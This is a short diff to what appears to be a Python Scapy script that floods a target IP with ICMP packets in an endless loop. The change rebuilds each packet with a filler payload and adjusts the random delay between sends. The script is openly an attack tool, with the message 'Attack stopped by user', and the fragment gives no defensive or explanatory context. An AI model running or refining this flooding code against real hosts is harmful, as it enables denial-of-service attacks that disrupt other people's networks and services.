@@ -14,7 +14,8 @@ packet = IP(dst=target_ip)/ICMP()/os.urandom(packet_size)
 
 try:
     while True:
-        send(packet, verbose=0)
-        time.sleep(delay * random.uniform(0.9, 1.2))
+        pkt = IP(dst=target_ip)/ICMP()/("X" * packet_size)
+        send(pkt, verbose=0)
+        time.sleep(delay * random.uniform(0.8, 1.2))
 except KeyboardInterrupt:
     print("\n[!] Attack stopped by user.")
